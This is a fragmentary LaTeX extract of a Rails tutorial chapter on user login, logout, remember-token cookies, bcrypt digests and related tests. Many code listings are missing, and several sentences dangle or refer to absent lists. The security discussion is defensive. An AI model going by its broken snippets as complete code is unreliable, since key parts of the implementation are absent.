This practice of remembering variable assignments from one method invocation to the next is known as \href{http://en.wikipedia.org/wiki/Memoization}{\emph{memoization}}.
(Note that this is a technical term; in particular, it's \emph{not} a misspelling of ``memorization''.)
Recalling the \emph{or}~operator \texttt{||} seen in Section~\ref{sec:objects_and_message_passing}, we can rewrite this as follows:
Because a User object is true in a boolean context, the call to \kode{find\_by} only gets executed if \kode{@current\_user} hasn't yet been assigned.
Although the preceding code would work, it's not idiomatically correct Ruby; instead, the proper way to write the assignment to \kode{@current\_user} is like this:
@current_user ||= User.find_by(id: session[:user_id])
The \texttt{||=} (``or equals'') assignment operator is a common Ruby idiom and is thus important for aspiring Rails developers to recognize.
Although at first it may seem mysterious, \emph{or equals} is easy to understand by analogy.
We start by noting the common pattern of incrementing a variable:
<n><n>\begin{verbatim}
<n>  x = x + 1
Many languages provide a syntactic shortcut for this operation; in Ruby (and in C, C++, Perl, Python, Java, etc.), it can also appear as follows:
<n>  x += 1
Analogous constructs exist for other operators as well:
<n>  $ rails console<n>  >> x = 1<n>  => 1<n>  >> x += 1<n>  => 2<n>  >> x *= 3<n>  => 6<n>  >> x -= 8<n>  => -2<n>  >> x /= 2<n>  => -1
In each case, the pattern is that \texttt{x = x O y} and \texttt{x O= y} are equivalent for any operator \texttt{O}.
Another common Ruby pattern is assigning to a variable if it's \texttt{nil} but otherwise leaving it alone.
Recalling the \emph{or}~operator \texttt{||} seen in Section~\ref{sec:objects_and_message_passing}, we can write this as follows:
<n>  >> @foo<n>  => nil<n>  >> @foo = @foo || "bar"<n>  => "bar"<n>  >> @foo = @foo || "baz"<n>  => "bar"
Since \texttt{nil} is false in a boolean context, the first assignment to \texttt{@foo} is \texttt{nil || "bar"}, which evaluates to \texttt{"bar"}.
Similarly, the second assignment is \texttt{@foo || "baz"}, i.e., \texttt{"bar" || "baz"}, which also evaluates to \texttt{"bar"}.
This is because anything other than \texttt{nil} or \texttt{false} is \texttt{true} in a boolean context, and the series of \texttt{||} expressions terminates after the first true expression is evaluated.
(This practice of evaluating \texttt{||} expressions from left to right and stopping on the first true value is known as \emph{short-circuit evaluation}.
Comparing the console sessions for the various operators, we see that \texttt{@foo = @foo || "bar"} follows the \texttt{x = x O y} pattern with \texttt{||} in the place of \texttt{O}:
<n>  x    =   x   +   1      ->     x     +=   1<n>  x    =   x   *   3      ->     x     *=   3<n>  x    =   x   -   8      ->     x     -=   8<n>  x    =   x   /   2      ->     x     /=   2<n>  @foo = @foo || "bar"    ->     @foo ||= "bar"
In the context of the current user, this suggests the following construction:
(By the way, under the hood Ruby actually evaluates the expression \texttt{@foo || @foo = "bar"}, which avoids an unnecessary assignment when \texttt{@foo} is \texttt{nil} or \texttt{false}.
But this expression doesn't explain the \texttt{||=} notation as well, so the above discussion uses the nearly equivalent \texttt{@foo = @foo || "bar"}.)
in Listing~\ref{code:current_user}.
Finding the current user in the session.
With the working \kode{current\_user} method in Listing~\ref{code:current_user}, we're now in a position to make changes to our application based on user login status.
The first practical application of logging in involves changing the layout links based on login status.
Note in Figure~\ref{fig:login_success_mockup} that the logout and profile links appear in a dropdown ``Account'' menu; we'll see in Listing~\ref{code:layout_login_logout_links} how to make such a menu with Bootstrap.
A mockup of the user profile after a successful login.
At this point, in real life I would consider writing an integration test to capture the behavior described above.
In this case, though, such a test involves several new ideas, so for now it's best deferred to its own section (Section~\ref{sec:testing_layout_changes}).
The way to change the links in the site layout involves using an<n>if-else statement inside embedded Ruby to show one set of links if the user is logged in and another set of links otherwise:
This kind of code requires the existence of a \kode{logged\_in?}\ boolean method, which we'll now define.
Checking for this requires the use of the ``not'' operator (Section~\ref{sec:objects_and_message_passing}), written using an exclamation point~\kode{!} and usually read as ``bang''.
The resulting \kode{logged\_in?}\ method appears in Listing~\ref{code:logged_in_p}.
The \kode{logged\_in?}\ 
With addition in Listing~\ref{code:logged_in_p}, we're now ready to change the layout links if a user is logged in.
There are four new links, two of which are stubbed out (to be completed in Chapter~\ref{cha:updating_showing_and_deleting_users}):
The logout link, meanwhile, uses the logout path defined in Listing~\ref{code:sessions_resource}:
Web browsers can't actually issue \texttt{DELETE} requests; Rails fakes it with JavaScript.
Here we could write
but as usual Rails allows us to link directly to the user by automatically converting \kode{current\_user} into \kode{user\_path(current\_user)} in this context.
Finally, when users \emph{aren't} logged in, we'll use the login path defined in Listing~\ref{code:sessions_resource} to make a link to the login form:
Putting everything together gives the updated header partial shown in Listing~\ref{code:layout_login_logout_links}.
Changing the layout links for logged-in users.
</li>
See the \href{http://getbootstrap.com/components/}{Bootstrap components page} for more information.
as shown in Listing~\ref{code:bootstrap_js}.
Adding the Bootstrap JavaScript library to \kode{application.js}.
//= require jquery
//= require jquery_ujs
//= require bootstrap
//= require_tree .
in Listing~\ref{code:layout_login_logout_links} and
If you quit your browser completely, you should also be able to verify that the application forgets your login status, requiring you to log in again to see the changes described above.
A logged-in user with new links and a dropdown menu.
Having verified by hand that the application is behaving properly upon successful login, before moving on we'll write an integration test to capture that behavior and catch regressions.
We'll build on the test from Listing~\ref{code:flash_persistence_test} and write a series of steps to verify the following sequence of actions:
Post valid information to the sessions path.
Verify that the login link disappears.
Verify that a logout link appears
Verify that a profile link appears.
In order to see these changes, our test needs to log in as a previously registered user, which means that such a user must already exist in the database.
The default Rails way to do this is to use \emph{fixtures}, which are a way of organizing data to be loaded into the test database.
We discovered in Section~\ref{sec:uniqueness_validation} that we needed to delete the default fixtures so that our email uniqueness tests would pass (Listing~\ref{code:empty_fixtures}).
Now we're ready to start filling in that empty file with custom fixtures of our own.
In the present case, we need only one user, whose information should consist of a valid name and email address.
Because we'll need to log the user in, we also have to include a valid password to compare with the password submitted to the Sessions controller's \kode{create} action.
Referring to the data model in Figure~\ref{fig:user_model_password_digest}, we see that this means creating a \kode{password\_digest} attribute for the user fixture, which we'll accomplish by defining a \kode{digest} method of our own.
As discussed in Section~\ref{sec:a_hashed_password}, the password digest is created using bcrypt (via \kode{has\_secure\_password}), so we'll need to create the fixture password using the same method.
By inspecting the \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{secure password source code}, we find that this method is
where \kode{string} is the string to be hashed and \kode{cost} is the \emph{cost parameter} that determines the computational cost to calculate the hash.
Using a high cost makes it computationally intractable to use the hash to determine the original password, which is an important security precaution in a production environment, but in tests we want the \kode{digest} method to be as fast as possible.
The secure password source code has a line for this as well:
This rather obscure code, which you don't need to understand in detail, arranges for precisely the behavior described above: it uses the minimum cost parameter in tests and a normal (high) cost parameter in production.
(We'll learn more about the strange \kode{?}-\kode{:} notation in Section~\ref{sec:remember_me_checkbox}.)
There are several places we could put the resulting \kode{digest} method, but we'll have an opportunity in Section~\ref{sec:remember_token} to reuse \kode{digest} in the User model.
This suggests placing the method in \kode{user.rb}.
Because we won't necessarily have access to a user object when calculating the digest (as will be the case in the fixtures file), we'll attach the \kode{digest} method to the User class itself, which (as we saw briefly in Section~\ref{sec:constructors}) makes it a \emph{class method}.
The result appears in Listing~\ref{code:digest_method}
Adding a digest method for use in fixtures.
# Returns the hash digest of the given string.
With the \kode{digest} method from Listing~\ref{code:digest_method}, we are now ready to create a user fixture for a valid user, as shown in Listing~\ref{code:real_user_fixture}.
A fixture for testing user login.
Note in particular that fixtures support embedded Ruby, which allows us to use
to create the valid password digest for the test user.
Although we've defined the \kode{password\_digest} attribute required by \linebreak \kode{has\_secure\_password}, sometimes it's convenient to refer to the plain (virtual) password as well.
Unfortunately, this is impossible to arrange with fixtures, and adding a \kode{password} attribute to Listing~\ref{code:real_user_fixture} causes Rails to complain that there is no such column in the database (which is true).
We'll make do by adopting the convention that all fixture users have the same password (\kode{'password'}).
Having created a fixture with a valid user, we can retrieve it inside a test as follows:
Here \kode{users} corresponds to the fixture filename \kode{users.yml}, while the symbol \kode{:michael} references user with the key shown in Listing~\ref{code:real_user_fixture}.
With the fixture user as above, we can now write a test for the layout links by converting the sequence enumerated at the beginning of this section into code, as shown in Listing~\ref{code:user_login_test_valid_information}.
A test for user logging in with valid information. 
logout_path
Here we've used
to check the right redirect target and
to actually visit the target page.
Listing~\ref{code:user_login_test_valid_information} also verifies that the login link disappears by verifying that there are \emph{zero} login path links on the page:
By including the extra \kode{count: 0} option, we tell \kode{assert\_select} that we expect there to be zero links matching the given pattern.
(Compare to \kode{count: 2} in Listing~\ref{code:layout_links_test}, which checks for exactly two matching links.)
Because the application code was already working, this test should be \linebreak \passing:
$ bundle exec rake test TEST=test/integration/users_login_test.rb \<n>>                       TESTOPTS="--name test_login_with_valid_information"
This shows how to run a specific test within a test file by passing the option
TESTOPTS="--name test_login_with_valid_information"
containing the name of the test. (A test's name is just the word ``test'' and the words in the test description joined using underscores.)
Although our authentication system is now working, newly registered users might be confused, as they are not logged in by default.
Because it would be strange to force users to log in immediately after signing up, we'll log in new users automatically as part of the signup process.
To arrange this behavior, all we need to do is add a call to \kode{log\_in} in the Users controller \kode{create} action, as shown in Listing~\ref{code:login_upon_signup}
As with the Sessions controller, the \kode{log\_in} method is available in the Users controller because of the module inclusion in Listing~\ref{code:sessions_helper_include}.
Logging in the user upon signup.
To test the behavior from Listing~\ref{code:login_upon_signup}, we can add a line to the test from Listing~\ref{code:a_test_for_valid_submission} to check that the user is logged in.
It's helpful in this context to define a \kode{is\_logged\_in?}\ helper method to parallel the \kode{logged\_in?}\ helper defined in Listing~\ref{code:logged_in_p}, which returns \kode{true} if there's a user id in the (test) session and false otherwise (Listing~\ref{code:test_helper_sessions}).
(Because helper methods aren't available in tests, we can't use the \kode{current\_user} as in Listing~\ref{code:logged_in_p}, but the \kode{session} method is available, so we use that instead.)
Here we use \kode{is\_logged\_in?}\ instead of \kode{logged\_in?}\ so that the test helper and Sessions helper methods have different names, which prevents them from being mistaken for each other
For example, I once had a test suite that was \passing\ even after accidentally deleting the main \kode{log\_in} method in the Sessions helper.
The reason is that the tests were happily using a test helper with the same name, thereby passing even though the application was completely broken.
As with \kode{is\_logged\_in?}, we'll avoid this issue by defining the test helper \kode{log\_in\_as} in Listing~\ref{code:test_helper_log_in}.
A boolean method for login status inside tests.
With the code in Listing~\ref{code:test_helper_sessions}, we can assert that the user is logged in after signup using the line shown in  Listing~\ref{code:login_after_signup_test}.
A test of login after signup. 
At this point, the test suite should still be \passing:
As discussed in Section~\ref{sec:sessions_and_failed_login}, our authentication model is to keep users logged in until they log out explicitly.
In this section, we'll add this necessary logout capability.
Because the ``Log out'' link has already been defined (Listing~\ref{code:layout_login_logout_links}), all we need is to write a valid controller action to destroy user sessions.
So far, the Sessions controller actions have followed the RESTful convention of using \kode{new} for a login page and \kode{create} to complete the login.
We'll continue this theme by using a \kode{destroy} action to delete sessions, i.e., to log out.
Unlike the login functionality, which we use in both Listing~\ref{code:log_in_success} and Listing~\ref{code:login_upon_signup}, we'll only be logging out in one place, so we'll put the relevant code directly in the \kode{destroy} action.
As we'll see in Section~\ref{sec:remember_tests}, this design (with a little refactoring) will also make the authentication machinery easier to test.
Some browsers offer a ``\href{http://stackoverflow.com/questions/20449641/rails-4-session-value-never-expires-or-dies-when-browser-closes}{remember where I left off}'' feature, which restores the session automatically, so be sure to disable any such feature before trying to log out.
Setting \kode{@current\_user} to \kode{nil} would only matter if \kode{@current\_user} were created before the \kode{destroy} action (which it isn't) \emph{and} if we didn't issue an immediate redirect (which we do).
This is an unlikely combination of events, and with the application as presently constructed it isn't necessary, but because it's security-related I include it for completeness.
as shown in Listing~\ref{code:log_out_method}.
The \kode{log\_out} method.
# Logs out the current user.
as shown in Listing~\ref{code:destroy_session}.
Destroying a session (user logout).
To test the logout machinery, we can add some steps to the user login test from Listing~\ref{code:user_login_test_valid_information}.
After logging in, we use \kode{delete} to issue a \texttt{DELETE} request to the logout path (Table~\ref{table:RESTful_sessions}) and verify that the user is logged out and redirected to the root URL. We also check that the login link reappears and that the logout and profile links disappear.
The new steps appear in Listing~\ref{code:user_logout_test}.
A test for user logout. 
(Now that we have \kode{is\_logged\_in?}\ available in tests, we've also thrown in a bonus \kode{assert is\_logged\_in?}\ immediately after posting valid information to the sessions path.)
The login system we finished in Section~\ref{sec:logging_in} is self-contained and fully functional, but most websites have the additional capability of remembering users' sessions even after they close their browsers.
In this section, we'll start by remembering user logins by default, expiring their sessions only when they explicitly log out.
In Section~\ref{sec:remember_me_checkbox}, we'll enable a common alternative model, a ``remember me'' checkbox that allows users to opt out of being remembered.
Both of these models are professional-grade, with the first used by sites such as \href{http://github.com/}{GitHub} and \href{http://bitbucket.org/}{Bitbucket}, and the second used by sites such as \href{http://www.facebook.com/}{Facebook} and \href{http://twitter.com/}{Twitter}.
In Section~\ref{sec:logging_in}, we used the Rails \kode{session} method to store the user's id, but this information disappears when the user closes their browser.
In this section, we'll take the first step toward persistent sessions by generating a \emph{remember token} appropriate for creating permanent cookies using the \kode{cookies} method, together with a secure \emph{remember digest} for authenticating those tokens.
As noted in Section~\ref{sec:a_working_log_in_method}, information stored using \kode{session} is automatically secure, but this is not the case with information stored using \kode{cookies}.
In particular, persistent cookies are vulnerable to \href{http://en.wikipedia.org/wiki/Session_hijacking}{session hijacking}, in which an attacker uses a stolen remember token to log in as a particular user.
Session hijacking was widely publicized by the \href{http://codebutler.com/firesheep}{Firesheep} application, which showed that remember tokens at many high-profile sites were visible when connected to public Wi-Fi networks.
We prevented the first problem in Section~\ref{sec:professional_grade_deployment} by using \href{https://en.wikipedia.org/wiki/Transport_Layer_Security}{Secure Sockets Layer} (SSL) site-wide, which protects network data from packet sniffers.
We'll prevent the second problem by storing a hash digest of the remember token instead of the token itself, in much the same way that we stored password digests instead of raw passwords in Section~\ref{sec:adding_a_secure_password}.
Rails automatically prevents the third problem by escaping any content inserted into view templates.
Finally, although there's no iron-clad way to stop attackers who have physical access to a logged-in computer, we'll minimize the fourth problem by changing tokens every time a user logs out and by taking care to \emph{cryptographically sign} any potentially sensitive information we place on the browser.
With these design and security considerations in mind, our plan for creating persistent sessions appears as follows:
Create a random string of digits for use as a remember token.
Place the token in the browser cookies with an expiration date far in the future.
Save the hash digest of the token to the database.
Place an encrypted version of the user's id in the browser cookies.
When presented with a cookie containing a persistent user id, find the user in the database using the given id, and verify that the remember token cookie matches the associated hash digest from the database.
Note how similar the final step is to logging a user in, where we retrieve the user by email address and then verify (using the \kode{authenticate} method) that the submitted password matches the password digest (Listing~\ref{code:find_authenticate_user}).
As a result, our implementation will parallel aspects of \kode{has\_secure\_password}.
We'll start by adding the required \kode{remember\_digest} attribute to the User model, as shown in Figure~\ref{fig:user_model_remember_digest}.
The User model with an added \kode{remember\_digest} attribute.
To add the data model from Figure~\ref{fig:user_model_remember_digest} to our application, we'll generate a migration:
(Compare to the password digest migration in Section~\ref{sec:a_hashed_password}.)
As in previous migrations, we've used a migration name that ends in \kode{\_to\_users} to tell Rails that the migration is designed to alter the \kode{users} table in the database.
Because we also included the attribute (\kode{remember\_digest}) and type (\kode{string}), Rails generates a default migration for us, as shown in Listing~\ref{code:add_remember_digest_to_users_generated}.
The generated migration for the remember digest.
Because we don't expect to retrieve users by remember digest, there's no need to put an index on the \kode{remember\_digest} column, and we can use the default migration as generated above:
Now we have to decide what to use as a remember token.
There are many mostly equivalent possibilities---essentially, any long random string will do.
This choice is based on the \href{http://railscasts.com/episodes/274-remember-me-reset-password}{RailsCast on remember me}.
A typical base64 string appears as follows:
Indeed, it had better be OK, because with bcrypt's \href{https://en.wikipedia.org/wiki/Salt_%28cryptography%29}{salted hashes} there's no way for us to tell if two users' passwords match.
With unique remember tokens, an attacker always needs \emph{both} the user id and the remember token cookies to hijack the session.
As a bonus, by using base64 strings specifically designed to be safe in URLs (as indicated by the name \kode{urlsafe\_base64}), we'll be able to use the same token generator to make account activation and password reset links in Chapter~\ref{cha:account_activation_and_password_reset}.
Remembering users involves creating a remember token and saving the digest of the token to the database.
We've already defined a \kode{digest} method for use in the test fixtures (Listing~\ref{code:digest_method}), and we can use the results of the discussion above to create a \kode{new\_token} method to create a new token.
As a general rule, if a method doesn't need an instance of an object, it should be a class method.
Indeed, this decision will prove important in Section~\ref{sec:account_activation_mailer}.
in Listing~\ref{code:token_method}.
Adding a method for generating tokens.
Our plan for the implementation is to make a \kode{user.remember} method that associates a remember token with the user and saves the corresponding remember digest to the database.
Because of the migration in Listing~\ref{code:add_remember_digest_to_users_generated}, the User model already has a \kode{remember\_digest} attribute, but it doesn't yet have a \kode{remember\_token} attribute.
We need a way to make a token available via \kode{user.remember\_token} (for storage in the cookies) \emph{without} storing it in the database.
We solved a similar issue with secure passwords in Section~\ref{sec:adding_a_secure_password}, which paired a virtual \kode{password} attribute with a secure \kode{password\_digest} attribute in the database.
In that case, the virtual \kode{password} attribute was created automatically by \kode{has\_secure\_password}, but we'll have to write the code for a \kode{remember\_token} ourselves.
The way to do this is to use \kode{attr\_accessor} to create an accessible attribute, which we saw before in Section~\ref{sec:a_user_class}:
Note the form of the assignment in the first line of the \kode{remember} method.
Because of the way Ruby handles assignments inside objects, without \kode{self} the assignment would create a \emph{local} variable called \kode{remember\_token}, which isn't what we want.
(Now you know why the \kode{before\_save} callback from Listing~\ref{code:email_downcase} uses \kode{self.email} instead of just \kode{email}.)
Meanwhile, the second line of \kode{remember} uses the \kode{update\_attribute} method to update the remember digest. (
As noted in Section~\ref{sec:updating_user_objects}, this method bypasses the validations, which is necessary in this case because we don't have access to the user's password or confirmation.)
in Listing~\ref{code:user_model_remember}.
Adding a \kode{remember} method to the User model. 
Having created a working \kode{user.remember} method, we're now in a position to create a persistent session by storing a user's (encrypted) id and remember token as permanent cookies on the browser.
The way to do this is with the \kode{cookies} method, which (as with \kode{session}) we can treat as a hash.
A cookie consists of two pieces of information, a \kode{value} and an optional \kode{expires} date.
For example, we could make a persistent session by creating a cookie with value equal to the remember token that expires 20~years from now:
This pattern of setting a cookie that expires 20 years in the future is so common that Rails has a special \kode{permanent} method to implement it, so that we can simply write
remember_token
Cookies expire \texttt{20.years.from\_now}
You may recall from Section~\ref{sec:a_class_of_our_own} that Ruby lets you add methods to \emph{any} class, even built-in ones.
In that section, we added a \texttt{palindrome?}\ method to the \texttt{String} class (and discovered as a result that \texttt{"deified"} is a palindrome), and we also saw how Rails adds a \texttt{blank?}\ method to class \texttt{Object} (so that \texttt{"".blank?}, \texttt{"~".blank?}, and \texttt{nil.blank?}\ are all \texttt{true}).
The \texttt{cookies.permanent} method, which creates ``permanent'' cookies with an expiration \texttt{20.years.from\_now}, gives yet another example of this practice through one of Rails' \emph{time helpers}, which are methods added to \texttt{Fixnum} (the base class for integers):
<n>  $ rails console<n>  >> 1.year.from_now<n>  => Sun, 09 Aug 2015 16:48:17 UTC +00:00<n>  >> 10.weeks.ago<n>  => Sat, 31 May 2014 16:48:45 UTC +00:00
Rails adds other helpers, too:
<n>  >> 1.kilobyte<n>  => 1024<n>  >> 5.megabytes<n>  => 5242880
These are useful for upload validations, making it easy to restrict, say, image uploads to \texttt{5.megabytes}.
Although it should be used with caution, the flexibility to add methods to built-in classes allows for extraordinarily natural additions to plain Ruby.
Indeed, much of the elegance of Rails ultimately derives from the malleability of the underlying Ruby language.
To store the user's id in the cookies, we could follow the pattern used with the \kode{session} method (Listing~\ref{code:log_in_function}) using something like
Because it places the id as plain text, this method exposes the form of the application's cookies and makes it easier for an attacker to compromise user accounts.
To avoid this problem, we'll use a \emph{signed} cookie, which securely encrypts the cookie before placing it on the browser:
Because we want the user id to be paired with the permanent remember token, we should make it permanent as well, which we can do by chaining the \kode{signed} and \kode{permanent} methods:
After the cookies are set, on subsequent page views we can retrieve the user with code like
where \kode{cookies.signed[:user\_id]} automatically decrypts the user id \linebreak cookie.
We can then use bcrypt to verify that \kode{cookies[:remember\_token]} matches the \kode{remember\_digest} generated in Listing~\ref{code:user_model_remember}.
(In case you're wondering why we don't just use the signed user id, without the remember token, this would allow an attacker with possession of the encrypted id to log in as the user in perpetuity.
In the present design, an attacker with both cookies can log in as the user only until the user logs out.)
The final piece of the puzzle is to verify that a given remember token matches the user's remember digest, and in this context there are a couple of equivalent ways to use bcrypt to verify a match.
If you look at the \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{secure password source code}, you'll find a comparison like this
As noted in Section~\ref{sec:a_hashed_password}, ``unencrypted password'' is a misnomer, as the secure password is \emph{hashed}, not encrypted.
In our case, the analogous code would look like this:
If you think about it, this code is really strange: it appears to be comparing a bcrypt password digest directly with a token, which would imply \emph{decrypting} the digest in order to compare using \kode{==}.
But the whole point of using bcrypt is for hashing to be irreversible, so this can't be right.
Indeed, digging into the \href{https://github.com/codahale/bcrypt-ruby/blob/master/lib/bcrypt/password.rb}{source code of the bcrypt gem} verifies that the comparison operator \kode{==} is being \emph{redefined}, and under the hood the comparison above is equivalent to the following:
Instead of \kode{==}, this uses the boolean method \kode{is\_password?}\ to perform the comparison.
Because its meaning is a little clearer, we'll prefer this second comparison form in the application code.
The above discussion suggests putting the digest--token comparison into an \kode{authenticated?}\ method in the User model, which plays a similar role to the \kode{authenticate} method provided by \kode{has\_secure\_password} for authenticating a user (Listing~\ref{code:log_in_success}).
The implementation appears in Listing~\ref{code:authenticated_p}.
(Although the \kode{authenticated?}\ method in Listing~\ref{code:authenticated_p} is tied specifically to the remember digest, it will turn out to be useful in other contexts as well, and we'll generalize it in Chapter~\ref{cha:account_activation_and_password_reset}.)
Adding an \kode{authenticated?}\ 
(Because the argument refers to the remember token, it is not uncommon to use a method argument that has the same name.)
Also note the use of the \kode{remember\_digest} attribute, which is the same as \kode{self.remember\_digest} and, like \kode{name} and \kode{email} in Chapter~\ref{cha:modeling_users}, is created automatically by Active Record based on the name of the corresponding database column (Listing~\ref{code:add_remember_digest_to_users_generated}).
We're now in a position to remember a logged-in user, which we'll do by adding a \kode{remember} helper to go along with \kode{log\_in}, as shown in Listing~\ref{code:log_in_with_remember}.
Logging in and remembering a user.
As with \kode{log\_in}, Listing~\ref{code:log_in_with_remember} defers the real work to the Sessions helper, where we define a \kode{remember} method that calls \kode{user.remember}, thereby generating a remember token and saving its digest to the database.
It then uses \kode{cookies} to create permanent cookies for the user id and remember token as described above.
The result appears in Listing~\ref{code:remember_method}
Remembering the user.
With the code in Listing~\ref{code:remember_method}, a user logging in will be remembered in the sense that their browser will get a valid remember token, but it doesn't yet do us any good because the \kode{current\_user} method defined in Listing~\ref{code:current_user} knows only about the temporary session:
In the case of persistent sessions, we want to retrieve the user from the temporary session if \kode{session[:user\_id]} exists, but otherwise we should look for \kode{cookies[:user\_id]} to retrieve (and log in) the user corresponding to the persistent session.
We can accomplish this as follows:
in Listing~\ref{code:find_authenticate_user}.
The code above will work, but note the repeated use of both \kode{session} and \kode{cookies}.
We can eliminate this duplication as follows:
This uses the common but potentially confusing construction
Despite appearances, this is \emph{not} a comparison (which would use double-equals \kode{==}), but rather is an \emph{assignment}.
to read
I generally use the convention of putting such assignments in parentheses, which is a visual reminder that it's not a comparison.
Defining the \kode{current\_user} helper as discussed above leads to the implementation shown in Listing~\ref{code:persistent_current_user}.
Updating \kode{current\_user} for persistent sessions. 
# Returns the user corresponding to the remember token cookie.
With the code as in Listing~\ref{code:persistent_current_user}, newly logged in users are correctly remembered, as you can verify by logging in, closing the browser, and checking that you're still logged in when you restart the sample application and revisit the sample application.
If you want, you can even inspect the browser cookies to see the result directly (Figure~\ref{fig:cookie_in_browser})
Google ``<your browser name> inspect cookies'' to learn how to inspect the cookies on your system.
The remember token cookie in the local browser.
There's only one problem with our application as it stands: short of clearing their browser cookies (or waiting 20 years), there's no way for users to log out.
To allow users to log out, we'll define methods to forget users in analogy with the ones to remember them.
The resulting \kode{user.forget} method just undoes \kode{user.remember} by updating the remember digest with \kode{nil}, as shown in Listing~\ref{code:user_model_forget}.
Adding a \kode{forget} method to the User model.
With the code in Listing~\ref{code:user_model_forget}, we're now ready to forget a permanent session by adding a \kode{forget} helper and calling it from the \kode{log\_out} helper (Listing~\ref{code:log_out_with_forget}).
Logging out from a persistent session.
# Forgets a persistent session.
There are two closely related subtleties left to address.
The first subtlety is that, even though the ``Log out'' link appears only when logged-in, a user could potentially have multiple browser windows open to the site.
Thanks to reader Paulo Célio Júnior for pointing this out.
Thanks to reader Niels de Ron for pointing this out.
For example, suppose that the user logs out in Firefox, thereby setting the remember digest to \kode{nil} (via \kode{user.forget} in Listing~\ref{code:user_model_forget}).
The application will still work in Firefox; because the \kode{log\_out} method in Listing~\ref{code:log_out_with_forget} deletes the user's id, both highlighted conditionals are \kode{false}:
As a result, evaluation falls off the end of the \kode{current\_user} method, thereby returning \kode{nil} as required.
Consequently, the inner \kode{if} conditional will be evaluated:
In particular, because \kode{user} isn't \kode{nil}, the \emph{second} expression will be evaluated, which raises an error.
This is because the user's remember digest was deleted as part of logging out (Listing~\ref{code:user_model_forget}) in Firefox, so when we access the application in Chrome we end up calling
with a \kode{nil} remember digest, thereby raising an exception inside the bcrypt library.
To fix this, we want \kode{authenticated?}\ to return \kode{false} instead.
These are exactly the sorts of subtleties that benefit from test-driven development, so we'll write tests to catch the two errors before correcting them.
from Listing~\ref{code:user_logout_test} to
as shown in Listing~\ref{code:test_double_logout}.
as shown in Listing~\ref{code:destroy_forget}.
Only logging out if logged in. 
The second case, involving a scenario with two different browsers, is harder to simulate with an integration test, but it's easy to check in the User model test directly.
All we need is to start with a user that has no remember digest (which is true for the \kode{@user} variable defined in the \kode{setup} method) and then call \kode{authenticated?}, as shown in Listing~\ref{code:test_authenticated_invalid_token}.
(Note that we've just left the remember token blank; it doesn't matter what its value is, because the error occurs before it ever gets used.)
A test of \kode{authenticated?}\ 
To fix the error and get to \passing, all we need to do is return \kode{false} if the remember digest is \kode{nil}, as shown in Listing~\ref{code:authenticated_p_fixed}.
Updating \kode{authenticated?}\ 
This uses the \kode{return} keyword to return immediately if the remember digest is \kode{nil}, which is a common way to emphasize that the rest of the method gets ignored in that case.
The equivalent code
would also work fine, but I prefer the explicitness of the version in Listing~\ref{code:authenticated_p_fixed} (which also happens to be slightly shorter).
With the code in Listing~\ref{code:authenticated_p_fixed}, our full test suite should be \passing, and both subtleties should now be addressed:
With the code in Section~\ref{sec:forgetting_users}, our application has a complete, professional-grade authentication system.
As a final step, we'll see how to make staying logged in optional using a ``remember me'' checkbox.
A mockup of the login form with such a checkbox appears in Figure~\ref{fig:login_remember_me_mockup}.
A mockup of a ``remember me'' checkbox.
To write the implementation, we start by adding a checkbox to the login form from Listing~\ref{code:login_form}.
As with labels, text fields, password fields, and submit buttons, checkboxes can be created with a Rails helper method.
In order to get the styling right, though, we have to \emph{nest} the checkbox inside the label, as follows:
Putting this into the login form gives the code shown in Listing~\ref{code:remember_me_checkbox}.
Adding a ``remember me'' checkbox to the login form.
In Listing~\ref{code:remember_me_checkbox}, we've included the CSS classes \kode{checkbox} and \kode{inline}, which Bootstrap uses to put the checkbox and the text (``Remember me on this computer'') in the same line.
In order to complete the styling, we need just a few more CSS rules, as shown in Listing~\ref{code:remember_me_css}.
The resulting login form appears in Figure~\ref{fig:login_form_remember_me}.
CSS for the ``remember me'' checkbox.
The login form with an added ``remember me'' checkbox.
Having edited the login form, we're now ready to remember users if they check the checkbox and forget them otherwise.
Incredibly, because of all our work in the previous sections, the implementation can be reduced to one line.
We start by noting that the \kode{params} hash for submitted login forms now includes a value based on the checkbox (as you can verify by submitting the form in Listing~\ref{code:remember_me_checkbox} with invalid information and inspecting the values in the debug section of the page).
In particular, the value of
is \kode{'1'} if the box is checked and \kode{'0'} if it isn't.
By testing the relevant value of the \kode{params} hash, we can now remember or forget the user based on the value of the submission
Note that this means unchecking the box will log out the user on all browsers on all computers.
The alternate design of remembering user login sessions on each browser independently is potentially more convenient for users, but it's less secure, and is also more complicated to implement.
Ambitious readers are invited to try their hand at implementing it.
Before we wrote \kode{remember user} without parentheses, but when used with the ternary operator omitting them results in a syntax error.
Adding this to the Sessions controller's \kode{create} method leads to the amazingly compact code shown in Listing~\ref{code:remember_me_ternary}.
(Now you're in a position to understand the code in Listing~\ref{code:digest_method}, which uses the ternary operator to define the bcrypt \kode{cost} variable.)
Handling the submission of the ``remember me'' checkbox.
With the implementation in Listing~\ref{code:remember_me_ternary}, our login system is complete, as you can verify by checking or unchecking the box in your browser.
10 types of people
There's an old joke that there are 10 kinds of people in the world: those who understand binary and those who don't (10, of course, being 2 in binary).
In this spirit, we can say that there are 10 kinds of people in the world: those who like the ternary operator, those who don't, and those who don't yet know about it.
(If you happen to be in the third category, soon you won't be any longer.)
When you do a lot of programming, you quickly learn that one of the most common bits of control flow goes something like this:
<n>  if boolean?
    do_one_thing
<n>  else
    do_something_else
Ruby, like many other languages (including C/C++, Perl, PHP, and Java), allows you to replace this with a much more compact expression using the \emph{ternary operator} (so called because it consists of three parts):
<n>  boolean? ?
do_one_thing : do_something_else
You can also use the ternary operator to replace assignment, so that
    var = foo
    var = bar
<n>  var = boolean? ?
foo : bar
Finally, it's often convenient to use the ternary operator in a function's return value:
<n>  def foo<n>    do_stuff<n>    boolean? ?
"bar" : "baz"
Since Ruby implicitly returns the value of the last expression in a function, here the \texttt{foo} method returns \texttt{"bar"} or \texttt{"baz"} depending on whether \texttt{boolean?}\ is \texttt{true} or \texttt{false}.
Although our ``remember me'' functionality is now working, it's important to write some tests to verify its behavior.
One reason is to catch implementation errors, as discussed in a moment.
Even more important, though, is that the core user persistence code is in fact completely untested at present.
Fixing these issues will require some trickery, but the result will be a far more powerful test suite.
Testing the ``remember me'' box
When I originally implemented the checkbox handling in Listing~\ref{code:remember_me_ternary}, instead of the correct
I actually used
In this context, \kode{params[:session][:remember\_me]} is either \kode{'0'} or \kode{'1'}, both of which are \kode{true} in a boolean context, so the resulting expression is \emph{always true}, and the application acts as if the checkbox is always checked.
This is exactly the kind of error a test can catch.
